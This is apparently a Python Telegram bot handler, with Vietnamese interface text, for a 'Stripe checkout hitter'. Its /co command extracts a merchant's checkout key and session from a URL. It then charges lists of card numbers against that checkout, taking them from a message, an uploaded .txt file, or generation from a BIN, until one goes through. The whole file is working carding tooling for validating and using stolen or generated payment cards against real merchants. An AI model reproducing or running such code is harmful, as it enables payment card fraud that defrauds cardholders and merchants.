# -*- coding: utf-8 -*-
"""Stripe checkout parse + charge. Support /co url [cards] and /co url bin BIN [count]."""
import time
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from card_utils import parse_cards
from bin_gen import generate_cards_from_bin
from hitter.checkout_parse import extract_checkout_url, get_checkout_info
from hitter.stripe_charge import charge_card

router = Router()

def _sym(c: str) -> str:
    return {"USD": "$", "EUR": "€", "GBP": "£"}.get(c, "")

@router.message(Command("co"))
async def cmd_co(msg: Message):
    text = (msg.text or "").strip()
    parts = text.split(maxsplit=3)
    if len(parts) < 2:
        await msg.answer(
            "Cách dùng:\n"
            "• <code>/co &lt;url_stripe&gt;</code> – Parse checkout\n"
            "• <code>/co &lt;url&gt; cc|mm|yy|cvv</code> – Charge 1 thẻ\n"
            "• <code>/co &lt;url&gt; bin &lt;BIN&gt; [số_lượng]</code> – Hit thẻ gen từ BIN",
            parse_mode=ParseMode.HTML,
        )
        return

    url = extract_checkout_url(parts[1]) or parts[1].strip()
    cards = []
    bin_mode = False
    bin_value = None
    bin_count = 1

    if len(parts) >= 3:
        if parts[2].lower() == "bin" and len(parts) >= 4:
            bin_mode = True
            bin_value = parts[3].strip().split()[0]
            sp = parts[3].strip().split()
            if len(sp) >= 2 and sp[1].isdigit():
                bin_count = min(int(sp[1]), 50)
            cards = [c for c in generate_cards_from_bin(bin_value, bin_count)]
            cards = [{"cc": c["cc"], "mm": c["mm"], "yy": c["yy"], "cvv": c["cvv"]} for c in cards]
        else:
            rest = " ".join(parts[2:]) if len(parts) > 2 else ""
            if msg.reply_to_message and getattr(msg.reply_to_message.document, "file_name", None):
                try:
                    doc = msg.reply_to_message.document
                    if doc.file_name and doc.file_name.endswith(".txt"):
                        f = await msg.bot.get_file(doc.file_id)
                        data = await msg.bot.download_file(f.file_path)
                        rest = data.read().decode("utf-8", errors="replace")
                except Exception:
                    pass
            cards = parse_cards(rest)

    status_msg = await msg.answer("⏳ Đang parse checkout...")
    checkout = await get_checkout_info(url)

    if checkout.get("error"):
        await status_msg.edit_text(f"❌ Lỗi: {checkout['error']}")
        return

    price = checkout.get("price") or 0
    currency = checkout.get("currency") or "USD"
    price_str = f"{_sym(currency)}{price:.2f} {currency}"

    if not cards:
        out = (
            f"✅ <b>Checkout</b> {price_str}\n"
            f"🏪 {checkout.get('merchant') or 'N/A'}\n"
            f"📦 {checkout.get('product') or 'N/A'}\n"
            f"🔑 PK: <code>{checkout.get('pk', '')[:24]}...</code>\n"
            f"🎫 CS: <code>{checkout.get('cs', '')}</code>"
        )
        await status_msg.edit_text(out, parse_mode=ParseMode.HTML)
        return

    await status_msg.edit_text(
        f"🔄 Đang charge {price_str} – {len(cards)} thẻ..."
    )
    start = time.perf_counter()
    results = []
    charged_one = None
    for card in cards:
        r = await charge_card(card, checkout, proxy_url=None)
        results.append(r)
        if r["status"] == "CHARGED":
            charged_one = r
            break

    total_time = round(time.perf_counter() - start, 2)
    charged_n = sum(1 for x in results if x["status"] == "CHARGED")
    declined_n = sum(1 for x in results if x["status"] == "DECLINED")
    three_ds = sum(1 for x in results if x["status"] == "3DS")

    if charged_one:
        out = (
            f"🟢 <b>CHARGED</b> {price_str}\n"
            f"💳 <code>{charged_one['card']}</code>\n"
            f"⏱ {charged_one['time']}s | Tổng {total_time}s\n"
            f"Thử: {len(results)} | ✅ {charged_n} | ❌ {declined_n} | 🔐 3DS {three_ds}"
        )
    else:
        out = (
            f"📊 Kết quả {price_str}\n"
            f"Thử: {len(results)} | ✅ {charged_n} | ❌ {declined_n} | 🔐 3DS {three_ds}\n"
            f"⏱ {total_time}s"
        )
        if results:
            r = results[-1]
            out += f"\n\nCuối: <code>{r['card']}</code> – {r['status']}: {r['response']}"

    await status_msg.edit_text(out, parse_mode=ParseMode.HTML)
